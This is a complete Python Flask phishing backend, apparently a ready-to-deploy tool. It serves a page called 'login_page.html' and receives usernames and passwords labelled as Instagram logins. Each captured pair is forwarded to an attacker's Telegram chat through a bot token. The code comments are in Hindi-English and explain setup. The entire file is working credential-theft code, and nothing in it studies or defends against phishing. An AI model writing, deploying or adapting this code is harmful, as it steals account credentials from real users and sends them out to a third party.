import os
import telebot
from flask import Flask, request, render_template

# Variables check (Testing ke liye aap direct string bhi daal sakte hain)
TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route("/")
def home():
    # Ye file 'templates' folder ke andar honi chahiye
    return render_template("login_page.html")

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")

    # Telegram par message bhejna
    message = f"🔔 **Instagram Login Attempt**\n\n👤 **User:** {username}\n🔑 **Pass:** {password}"
    try:
        bot.send_message(CHAT_ID, message, parse_mode="Markdown")
        return "ok", 200
    except Exception as e:
        print(f"Error: {e}")
        return "error", 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
    
